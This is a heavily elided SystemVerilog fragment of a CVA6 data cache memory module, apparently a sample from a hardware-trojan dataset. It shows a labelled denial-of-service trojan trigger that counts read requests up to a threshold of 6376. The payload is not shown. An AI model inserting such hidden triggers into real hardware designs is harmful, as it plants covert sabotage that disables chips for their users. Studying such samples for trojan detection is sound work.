...
module wt_dcache_mem_trojan_DoS
  import ariane_pkg::*;
  import wt_cache_pkg::*;
#(
  ...
  localparam AXI_OFFSET_WIDTH = CVA6Cfg.AxiDataWidth == CVA6Cfg.XLEN ? $clog2(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=6376)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 6376;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (rd_req_i) trojan_counter <= trojan_counter + 1;
